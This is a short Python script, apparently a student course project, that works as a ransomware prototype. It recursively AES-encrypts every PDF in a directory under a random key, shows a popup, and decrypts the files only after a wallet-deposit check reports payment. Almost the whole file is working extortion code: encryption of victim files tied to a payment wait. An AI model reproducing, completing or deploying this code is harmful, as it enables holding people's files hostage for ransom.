from base64 import encode
import os
import threading
import secrets
from util.AES import aes
from util.checkWallet import CheckWallet
from util.popup import PopUp

key = secrets.token_bytes(16)
iv = secrets.token_bytes(16)
a = aes(key, iv)
def encodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.encrypt(currentFile)


def decodeFiles(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith(".pdf"):
                currentFile = os.path.join(root, file)
                a.decrypt(currentFile)

def check():
    cw = CheckWallet()
    if cw.waitForDeposit() == True:
        print("decrypting")
        decodeFiles(path)
    print("Files have been decrypted!")

path = "C:/Users/nehpa/Desktop/repos/testing/cosc469-testing-data"

encodeFiles(path)
print("Files have been encrypted!")
t = threading.Thread(target=check)
t.start()
pu = PopUp()
pu.mainloop()
t.join()
